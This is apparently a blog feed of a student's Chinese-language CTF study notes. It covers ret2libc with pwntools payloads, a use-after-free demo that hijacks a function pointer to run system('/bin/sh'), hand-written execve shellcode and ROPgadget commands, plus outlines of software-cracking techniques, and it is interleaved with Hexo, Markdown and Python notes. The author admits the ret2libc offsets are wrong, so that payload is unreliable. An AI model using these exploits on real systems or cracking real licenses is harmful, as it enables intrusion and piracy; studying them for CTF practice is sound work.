      <content type="html"><![CDATA[<pre><code>&lt;center&gt;关于ret2libc 中的plt/got&lt;/center&gt; </code></pre><h1 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h1><p>即当第一次使用某函数时，GOT表中对应表项保存的并不是真实的函数地址，需要通过_dl_runtime_resolve查找到真实的函数地址并填入GOT对应表项，从而在下次再使用该函数时，无需进行查找。我们要泄漏的就是初始化查找后填入GOT对应表项中的函数地址。</p><ul><li>使用gdb，断点下在write函数之后，运行，x查看write.plt.got处的值，即实际地址；*<br><img src="/2018/08/28/pwn-入门1-3-plt-got/write.png" alt="图四">    <img src="/2018/08/28/pwn-入门1-3-plt-got/wrgot.png" alt="图五"></li></ul><h1 id="plt-与-got"><a href="#plt-与-got" class="headerlink" title="plt 与 got"></a>plt 与 got</h1><p>文件的plt表中存放着函数的.plt.got 地址，.plt.got 地址处的值为该函数的真正的got地址（也就是我们需要泄露的）</p><p>由于延迟绑定机制的存在，我们只能通过泄露被调用的函数的got地址，同时又因为同一libc库中各函数之间的偏移是固定的，我们就能因此来求出其他函数的got地址。</p><h1 id="ret2libc的实现"><a href="#ret2libc的实现" class="headerlink" title="ret2libc的实现"></a>ret2libc的实现</h1><ol><li>文件给了一个pwnme文件与libc-2.19.so文件；checksec查看文件保护，IDA 查看源码，可以看到buf大小只有0x8，read却允许读入0x100大小的数据，有着明显的栈溢出；</li></ol><figure class="image-box">                <img src="/2018/08/28/pwn-入门1-3-plt-got/ida.png" alt="图一](pwn-入门1-3-plt-got/checksec.png)  ![图二" title="" class="">                <p>图一](pwn-入门1-3-plt-got/checksec.png)  ![图二</p>            </figure><ol start="2"><li>查看应用调用函数plt表，<code>objdump -d -M intel -j .plt pwnme</code>可以看到没有调用system，需要我们利用其它已调用的来泄露；</li></ol><figure class="image-box">                <img src="/2018/08/28/pwn-入门1-3-plt-got/plt.png" alt="图三" title="" class="">                <p>图三</p>            </figure><ol start="3"><li>这里决定泄露write函数的got地址：使用pwntools，使程序运行完write函数，得到真实的got地址；</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwn = ELF(&apos;pwnme&apos;) </span><br><span class="line">sh.recvuntil(&apos;flag:&apos;) </span><br><span class="line">wri_got = pwn.got[&apos;write&apos;]</span><br></pre></td></tr></table></figure><ol start="4"><li>构造payload泄露write函数的实际地址</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pay = &apos;a&apos;*20 + p32(pwn.symbols[&apos;write&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(1) + p32(wri_got) + p32(4)</span><br></pre></td></tr></table></figure><ol start="4"><li>泄露libc中的system与/bin/sh地址</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(&apos;libc-2.19.so&apos;)</span><br><span class="line">sys_addr = wri_addr - libc.symbols[&apos;write&apos;] + libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_addr = wri_addr - libc.symbols[&apos;write&apos;] + libc.search(&apos;/bin/sh&apos;).next()</span><br></pre></td></tr></table></figure><ol start="5"><li>构造payload </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*20 + p32(sys_addr) + &apos;bbbb&apos; + p32(binsh_addr)</span><br></pre></td></tr></table></figure><p><em>因为某些不知名的原因，各个偏移得到的got地址并不是特别对，所以先不放wp。之后再补</em></p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn2.3--UAF</title>
      <link href="/2018/08/28/pwn-%E5%85%A5%E9%97%A8n-n/"/>
      <url>/2018/08/28/pwn-%E5%85%A5%E9%97%A8n-n/</url>
      <content type="html"><![CDATA[<h1 id="堆的UAF-use-after-free-利用"><a href="#堆的UAF-use-after-free-利用" class="headerlink" title="堆的UAF(use after free)利用"></a>堆的UAF(use after free)利用</h1><p><em>学长介绍了某CTF大佬聚集的交流群，但是入群需要做题，题目本来不是我这个段位可以搞定的，但是怎么说？有压力就有动力:)抱着入群的信念，<br>先看了misc，结果需要修复pyc文件，按流程走的时候出现了无法解决的一个奇怪问题，遂放弃；之后看了下pwn，感觉甚难；在看了逆向完全不会之后，<br>只能看了下pwn的tips，开始现学现卖。</em></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>就像它的名字一样，即一个内存块被释放后再次被使用；主要利用的是一个指针对应的内存块被释放后，对应的指针没有被设为NULL；<br>而如果在这个指针在下一次被使用之前对应的内存块仍未被修改，程序可能还会正常运转；而若被已经修改，则有可能被利用，UAF就是利用该漏洞。</p><ul><li>根本原因：应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。</li></ul><h2 id="漏洞的简单利用"><a href="#漏洞的简单利用" class="headerlink" title="漏洞的简单利用"></a>漏洞的简单利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">typedef void (*func_ptr)(char *);</span><br><span class="line">void evil_fuc(char command[])</span><br><span class="line">&#123;</span><br><span class="line">system(command);</span><br><span class="line">&#125;</span><br><span class="line">void echo(char content[])</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%s&quot;,content);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    func_ptr *p1=(func_ptr*)malloc(4*sizeof(int));</span><br><span class="line">    printf(&quot;malloc addr: %p\n&quot;,p1);</span><br><span class="line">    p1[3]=echo;</span><br><span class="line">    p1[3](&quot;hello world\n&quot;);</span><br><span class="line">    free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针</span><br><span class="line">    p1[3](&quot;hello again\n&quot;); //p1指针未被置空,虽然free了,但仍可使用.只是其内存块是被标记为空闲状态</span><br><span class="line">    func_ptr *p2=(func_ptr*)malloc(4*sizeof(int));//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来.</span><br><span class="line">    printf(&quot;malloc addr: %p\n&quot;,p2);</span><br><span class="line">    printf(&quot;malloc addr: %p\n&quot;,p1);//p2与p1指针指向的内存为同一地址</span><br><span class="line">    p2[3]=evil_fuc; //在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针.</span><br><span class="line">    p1[3](&quot;/bin/sh&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终运行效果：</p><figure class="image-box">                <img src="/2018/08/28/pwn-入门n-n/result.png" alt="result" title="" class="">                <p>result</p>            </figure><p><em>漏洞的利用方法原理上与其相同，之后会再加上入群题的解题过程</em></p><p>学习借鉴文章来源：<a href="https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1" target="_blank" rel="noopener">https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1</a></p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn1.2--ret2libc</title>
      <link href="/2018/08/28/pwn-%E5%85%A5%E9%97%A81-2/"/>
      <url>/2018/08/28/pwn-%E5%85%A5%E9%97%A81-2/</url>
      <content type="html"><![CDATA[<p>ret2libc学习</p><h1 id="ret2libc使用原因"><a href="#ret2libc使用原因" class="headerlink" title="ret2libc使用原因"></a>ret2libc使用原因</h1><p>程序不是静态编译，通常就不会有int 0x80<br>s<br>ret2syscall 就无法实现，因而使用</p><p>ret2library。</p><h1 id="调用函数的栈结构布局-："><a href="#调用函数的栈结构布局-：" class="headerlink" title="调用函数的栈结构布局 ："></a>调用函数的栈结构布局 ：</h1><ul><li><p>调用函数的返回地址</p></li><li><p>函数调用完的返回地址</p></li><li><p>调用函数的参数1</p></li><li><p>调用函数的参数2</p></li></ul><h1 id="利用过程分析："><a href="#利用过程分析：" class="headerlink" title="利用过程分析："></a>利用过程分析：</h1><p>ASLR使得每次载入的函数地址（base）都不同</p><p>实际地址 Address = base +offset</p><p><em>若地址为 0xf…  则其为实际地址；</em></p><p>offset在libc库中是固定的；</p><ul><li>查看libc库版本：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ldd  ./file</span><br></pre></td></tr></table></figure><ul><li>寻找偏移地址 ：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -a  /lib32/libc.so.6 | grep gets@</span><br></pre></td></tr></table></figure><ul><li>目标是寻找libc 的 base :</li></ul><p>1.通过程序中的其他函数leak 程序libc的实际地址（Address）,base = Address - offset</p><p>2.从stack残渣中获取libc地址信息</p><h1 id="延迟绑定（没搞清楚，之后再写）"><a href="#延迟绑定（没搞清楚，之后再写）" class="headerlink" title="延迟绑定（没搞清楚，之后再写）"></a>延迟绑定（没搞清楚，之后再写）</h1><p>函数调用方式：</p><p>call  func@plt –&gt; .got.plt –&gt;.got.plt的值为该func的实际地址（所需address）</p><h1 id="使用调用函数的栈结构布局："><a href="#使用调用函数的栈结构布局：" class="headerlink" title="使用调用函数的栈结构布局："></a>使用调用函数的栈结构布局：</h1><p>1.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">gets()</span><br><span class="line"></span><br><span class="line">pop1_ret(pop&lt;buf&gt; 然后 return）</span><br><span class="line"></span><br><span class="line">&lt;buf&gt;</span><br><span class="line"></span><br><span class="line">system()</span><br><span class="line"></span><br><span class="line">xxx</span><br><span class="line"></span><br><span class="line">&lt;buf&gt;</span><br></pre></td></tr></table></figure><p>2.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">gets()</span><br><span class="line"></span><br><span class="line">system()</span><br><span class="line"></span><br><span class="line">&lt;buf&gt;</span><br><span class="line"></span><br><span class="line">&lt;buf&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>软件保护/软件破解 及对抗</title>
      <link href="/2018/08/25/%E8%BD%AF%E4%BB%B6%E4%BF%9D%E6%8A%A4-%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3-%E5%8F%8A%E5%AF%B9%E6%8A%97/"/>
      <url>/2018/08/25/%E8%BD%AF%E4%BB%B6%E4%BF%9D%E6%8A%A4-%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3-%E5%8F%8A%E5%AF%B9%E6%8A%97/</url>
      <content type="html"><![CDATA[<h1 id="软件保护"><a href="#软件保护" class="headerlink" title="软件保护"></a>软件保护</h1><h2 id="简单算法注册保护："><a href="#简单算法注册保护：" class="headerlink" title="简单算法注册保护："></a>简单算法注册保护：</h2><p>输入用户名序列号，计算并检测序列号；</p><h2 id="简单算法注册保护的对抗："><a href="#简单算法注册保护的对抗：" class="headerlink" title="简单算法注册保护的对抗："></a>简单算法注册保护的对抗：</h2><p>①修改关键指令：暴力破解；patcher<br>②dll注入或使用加载器（使序列号计算结果展示出来）；内存注册机<br>③还原本身算法；keygen</p><h2 id="复杂算法注册保护："><a href="#复杂算法注册保护：" class="headerlink" title="复杂算法注册保护："></a>复杂算法注册保护：</h2><p>通常内置rsa公钥/签名/绑定硬件码/注册信息分段校验/运行时校验等；</p><h2 id="复杂算法注册保护的对抗："><a href="#复杂算法注册保护的对抗：" class="headerlink" title="复杂算法注册保护的对抗："></a>复杂算法注册保护的对抗：</h2><p>①patch<br>②补丁修改公钥，使用自己的公钥对；</p><h2 id="网络加密及硬件加密："><a href="#网络加密及硬件加密：" class="headerlink" title="网络加密及硬件加密："></a>网络加密及硬件加密：</h2><p>本质上与本地加密相同/运行前检测？？</p><h2 id="网络加密及硬件加密的对抗："><a href="#网络加密及硬件加密的对抗：" class="headerlink" title="网络加密及硬件加密的对抗："></a>网络加密及硬件加密的对抗：</h2><p>①patch<br>②模拟与远程端的通信，及模拟执行；<br>③使用中转程序，从服务器获得远程执行结果；</p><h2 id="复杂系统注册保护："><a href="#复杂系统注册保护：" class="headerlink" title="复杂系统注册保护："></a>复杂系统注册保护：</h2><p>以上内容混杂</p><p>附：常用–壳（压缩壳/加密壳）：程序运行前的检测，校验/程序注册机制/程序运行二次检测</p><h1 id="软件破解及对抗"><a href="#软件破解及对抗" class="headerlink" title="软件破解及对抗"></a>软件破解及对抗</h1><h2 id="程序分析及对抗："><a href="#程序分析及对抗：" class="headerlink" title="程序分析及对抗："></a>程序分析及对抗：</h2><ul><li>代码变形mutation；</li><li>代码膨胀expansion；</li><li>花指令；</li><li>代码乱序；</li><li>平坦化；</li></ul><h2 id="程序调试及对抗："><a href="#程序调试及对抗：" class="headerlink" title="程序调试及对抗："></a>程序调试及对抗：</h2><ul><li>系统API检测程序是否处于被调试状态；</li><li>检测调试器窗口信息、状态码；</li><li>检测调试器驱动，符号；</li><li>程序执行行为检测（如检测运行时间，时间较长则处于被调试状态）；</li><li>利用驱动接管本身程序的中断，阻止被调试器接管；</li><li>利用驱动修改内核参数，阻止程序被调试；</li><li>双进程反调试；</li></ul><h2 id="程序修改及对抗："><a href="#程序修改及对抗：" class="headerlink" title="程序修改及对抗："></a>程序修改及对抗：</h2><p>修改：文件补丁技术及工具；<br>对抗修改： hash校验/内存关键部分CRC校验/ipk劫持等；</p><p><em>dnspy：.NET程序逆向工具</em></p>]]></content>
      
      <categories>
          
          <category> RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hexo Essay Writing</title>
      <link href="/2018/08/15/hexo-essay-writing/"/>
      <url>/2018/08/15/hexo-essay-writing/</url>
      <content type="html"><![CDATA[<ol><li>打开git,进入MyBlog目录；</li><li>输入 <code>hexo new &quot;essay-name&quot;</code>；</li><li>打开source文件夹，找到 essay-name.md，使用markdown语法写作；</li><li>执行命令 <code>/ hexo clean / hexo generate/ hexo deploy</code>；</li><li>over；</li></ol><p><strong>假如hexo命令出现问题，基本上就是_config.yml 文件的空格有问题，看报错就好了。</strong></p>]]></content>
      
      <categories>
          
          <category> skills </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Markdown standard</title>
      <link href="/2018/08/13/markdown%E8%A7%84%E8%8C%83%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/08/13/markdown%E8%A7%84%E8%8C%83%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<h1 id="MarkDown-v1-0"><a href="#MarkDown-v1-0" class="headerlink" title="MarkDown v1.0"></a>MarkDown v1.0</h1><h2 id="1-1-全局规范"><a href="#1-1-全局规范" class="headerlink" title="1.1 全局规范"></a>1.1 全局规范</h2><p><a name="top"></a></p><ul><li>MarkDown 文件使用‘.md’结尾 （<strong>小写字母</strong>)</li></ul><h2 id="格式规范"><a href="#格式规范" class="headerlink" title="格式规范"></a>格式规范</h2><h3 id="标题结构格式"><a href="#标题结构格式" class="headerlink" title="标题结构格式"></a>标题结构格式</h3><p>1.标题与紧贴的’上下正文‘使用’1整行换行‘隔开<br>2.’#’号和文字之间’一个空格’连接<br>3.标题层级最多六级 ‘#’到’######’</p><h3 id="加强和强调规范"><a href="#加强和强调规范" class="headerlink" title="加强和强调规范"></a>加强和强调规范</h3><p>一般统一使用第一种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*emphasize*</span><br><span class="line">_emphasize_</span><br></pre></td></tr></table></figure><p>使用’~~’给文字添加删除线<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~~strikethrough~~</span><br></pre></td></tr></table></figure></p><h3 id="代码块规范"><a href="#代码块规范" class="headerlink" title="代码块规范"></a>代码块规范</h3><ul><li>行内代码使用’一对波浪号’如：<code>hello world!</code></li><li>块级代码使用’三个波浪号’或’整体四空格缩进’，且上下均用整行隔开，如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &apos;看源码之三个波浪号&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><pre><code>&lt;?php    echo &apos;看源码之四空格缩进&apos;;?&gt;</code></pre><h3 id="列表写法"><a href="#列表写法" class="headerlink" title="列表写法"></a>列表写法</h3><ul><li>列号’1.’或者’*’后内容用空格隔开</li><li>列表块前后’整行隔开’ 如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. Windows  </span><br><span class="line">2. Mac</span><br><span class="line">3. iOS</span><br><span class="line">    * iPhone</span><br><span class="line">    * iPad</span><br><span class="line">4. Android</span><br></pre></td></tr></table></figure><p><strong>实际预览：</strong></p><ol><li>Windows  </li><li>Mac</li><li>iOS<ul><li>iPhone</li><li>iPad</li></ul></li><li>Android</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* Windows  </span><br><span class="line">*  Mac</span><br><span class="line">*  iOS</span><br><span class="line">*  Android</span><br><span class="line">    1. v3.2</span><br><span class="line">    2. v4.1</span><br></pre></td></tr></table></figure><p><strong>实际预览：</strong></p><ul><li>Windows  </li><li>Mac</li><li>iOS</li><li>Android<ol><li>v3.2</li><li>v4.1</li></ol></li></ul><h3 id="其他标签规范"><a href="#其他标签规范" class="headerlink" title="其他标签规范"></a>其他标签规范</h3><p>链接和email</p><p>Inline：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">An [example](http://url.com/ &quot;title&quot;)</span><br></pre></td></tr></table></figure><p>实现效果：<br>An <a href="http://url.com/" title="title" target="_blank" rel="noopener">example</a></p><p>引用样式标签（titles are optional）:</p><pre><code>An [example][id].Then,anywhereelse in the doc,define the link:[id]:http://example.com/ &quot;title&quot;</code></pre><p>Email:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">An email &lt;example@example.com&gt; link.</span><br></pre></td></tr></table></figure><p>插图<br>Inline(titles are optional)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![alt text](/path/img.jpg &quot;title&quot;)</span><br></pre></td></tr></table></figure><p>引用式插图：</p><pre><code>![alt text][id][id]:/url/to/img.jpg &quot;title&quot;</code></pre><p>引用块及嵌套</p><blockquote><p>Email-style angle brackets<br>are used for blockquotes.</p></blockquote><blockquote><blockquote><p>And, they can be nested.</p></blockquote></blockquote><blockquote><h4 id="Headers-in-blockquotes"><a href="#Headers-in-blockquotes" class="headerlink" title="Headers in blockquotes"></a>Headers in blockquotes</h4><ul><li>You can quote a list.</li><li>Etc.</li></ul></blockquote><p>内联代码</p><p><code>&lt;code&gt;</code> 段落中的用法</p><p>也可以 <code>`代码中包含波浪号`</code>.<br>代码块</p><p>Indent every line of a code block by at least 4 spaces or 1 tab.<br>代码的每行都最少用4个空格或者一个制表符(tab)</p><p>我是普通文本块</p><pre><code>我是一个预格式化的代码块.</code></pre><p>水平分割线<br>三个<code>连字符-</code>:</p><hr><h3 id="表格规范"><a href="#表格规范" class="headerlink" title="表格规范"></a>表格规范</h3><p>一个简单的表格看起来如下：</p><table><thead><tr><th>第一个头部</th><th>第二个头部</th><th>第三个头部</th></tr></thead><tbody><tr><td>内容格子</td><td>内容格子</td><td>内容格子</td></tr><tr><td>内容格子</td><td>内容格子</td><td>内容格子</td></tr></tbody></table><p>每列的对齐可以通过在分割线上添加冒号来实现：</p><table><thead><tr><th style="text-align:left">第一个头部</th><th style="text-align:center">第二个头部</th><th style="text-align:right">第三个头部</th></tr></thead><tbody><tr><td style="text-align:left">左对齐</td><td style="text-align:center">居中</td><td style="text-align:right">右对齐</td></tr><tr><td style="text-align:left">左对齐</td><td style="text-align:center">居中</td><td style="text-align:right">右对齐</td></tr></tbody></table><h3 id="页内锚标记"><a href="#页内锚标记" class="headerlink" title="页内锚标记"></a>页内锚标记</h3><ul><li><a href="#11全局规范">点我跳转到顶部</a>   // 利用 <code>#</code>,<code>##</code> 生成 <code>id</code> 锚标签  </li><li><a href="#top">另一种锚标记</a> // 利用 <code>&lt;a name=&quot;top&quot;&gt;&lt;/a&gt;</code></li></ul><hr><p>附：参考 Hello-World.md 源码，<em>注意换行的使用</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Hello-World</span><br><span class="line"></span><br><span class="line">这是一个范例文件格式</span><br><span class="line">我是普通换行</span><br><span class="line"></span><br><span class="line">## 我是&lt;h2&gt;标题</span><br><span class="line"></span><br><span class="line">我是`&lt;h2&gt;`的内容</span><br><span class="line"></span><br><span class="line">## 我是&lt;h3&gt;标题</span><br><span class="line"></span><br><span class="line">* Windows  </span><br><span class="line">*  Mac</span><br><span class="line">*  iOS</span><br><span class="line">*  Android</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> skills </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn1.1</title>
      <link href="/2018/08/13/pwn-%E5%85%A5%E9%97%A81-1/"/>
      <url>/2018/08/13/pwn-%E5%85%A5%E9%97%A81-1/</url>
      <content type="html"><![CDATA[<h3 id="各种变量的存储位置"><a href="#各种变量的存储位置" class="headerlink" title="各种变量的存储位置"></a>各种变量的存储位置</h3><ol><li>stack：局部变量</li><li>heap: 动态分配内存的变量（malloc/new）</li><li>bss section: 全局化的未初始化的变量</li><li>data section: 全局化的已初始化的变量<ul><li>rodata: （只读data段）全局化的静态变量（const）</li></ul></li></ol><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int a = 0;   //.data</span><br><span class="line">int b;       //.bss</span><br><span class="line">const double PI = 3.1415    //rodata</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int c = 2;    //stack</span><br><span class="line">char *d = malloc(16);    //heap</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="linux下将shellcode运行"><a href="#linux下将shellcode运行" class="headerlink" title="linux下将shellcode运行"></a>linux下将shellcode运行</h3><p>1.手写简易shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">jmp sh</span><br><span class="line">run:</span><br><span class="line">    pop ebx</span><br><span class="line">    mov BYTE [ebx+7],0</span><br><span class="line">    xor eax,eax</span><br><span class="line">    mov al,11</span><br><span class="line">    xor ecx,ecx</span><br><span class="line">    xor edx,edx</span><br><span class="line">    int 0x80</span><br><span class="line">sh:</span><br><span class="line">    call run</span><br><span class="line">    db &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure><p>2.一系列步骤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Assembly:  nasm a.asm -o a.o -felf32   </span><br><span class="line">Extract Shellcode: objcopy -O binary a.o code   //将a.o中需要用内容的提取到code中</span><br><span class="line">                   xxd -i code        //将提取出来的code转换为机器码</span><br></pre></td></tr></table></figure><p>3.带入调用shellcode的程序test.c</p><pre><code>#include  &quot;code.h&quot;typedef int(*CODE)();int main(){    ((CODE)shellcode)();}Run Shellcode: gcc test.c -o test -m32 -zexexstack       </code></pre><p><em><a href="syscalls.kernelgrok.com" title="src">linux下的系统调用</a>.</em></p><h1 id="之前的一些小知识点笔记："><a href="#之前的一些小知识点笔记：" class="headerlink" title="之前的一些小知识点笔记："></a>之前的一些小知识点笔记：</h1><p>gadget :一小段以ret结尾的code</p><p>rop chain ：串联在一起的gadget</p><p>rop 类型：控制寄存器做syscall；使用原有程序的func；使用libc里的gadget或func（绕过ASLR）.</p><p>rop关键：</p><p>查找gadget：</p><pre><code>ROPgadget --binary ./fileROPgadget --binary ret2syscall  --only &apos;pop|ret&apos; | grep eax  ROPgadget --binary  --opcode cd80c3（int 0x80 ; ret ）</code></pre><p>排列gadget：</p><p>peda：vmmap 查看程序段的可读写执行情况</p><p>也可以：./file &amp;  (后台运行，返回pid0）</p><pre><code>cat  /proc/pid0/maps</code></pre>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Learning python</title>
      <link href="/2018/08/02/learning-python/"/>
      <url>/2018/08/02/learning-python/</url>
      <content type="html"><![CDATA[<p><em>最近将之前的博客逐渐搬运过来，因为可怜的服务器要到期了hhh</em></p><p><em>为了能够完成各色python脚本的编写，迫不得已入门python大法！ 以下为简易的py语法：</em></p><h1 id="Python-string"><a href="#Python-string" class="headerlink" title="Python string"></a>Python string</h1><ol><li><p>对于单个字符的编码，Python提供了ord()函数获取字符的整数表示，chr()函数把编码转换为对应的字符；</p><p>eg： ord(‘A’)  -&gt;65    chr(66) -&gt;B</p></li><li><p>对bytes类型的数据用带b前缀的单引号或双引号表示： x=b’abc’；</p></li><li><p>可以通过encode() 将Unicode表示的str编码为指定的 bytes；</p></li><li><p>格式化输出字符串：</p></li></ol><ul><li><p>c语言格式；</p></li><li><p>format 方法’aaaa{0}bbbb{1}cccccc……’.format(para1,para2…)参数会依次取代占位符{0} {1}{…}；</p></li></ul><h1 id="python-list-and-tuple"><a href="#python-list-and-tuple" class="headerlink" title="python list and tuple"></a>python list and tuple</h1><ol><li>list（列表） ：classmates = [‘elementl’, ‘element2’, [‘element31’,’element32’],’element4’]</li></ol><ul><li><p>len()得到元素个数；</p></li><li><p>classmates[-n]可以得到倒数第n个元素；</p></li><li><p>classmates.append(‘element’)追加元素到末尾；</p></li><li><p>insert(n,’element’)插入到指定位置；</p></li><li><p>pop()删除末尾元素；pop(i)删除指定位置元素；</p></li><li><p>classmates[n]=’element’直接替换为别的元素；</p></li><li><p>list元素可以是另一个list。</p></li></ul><ol start="2"><li>tuple（元组）： classmates = (‘elementl’, ‘element2’, 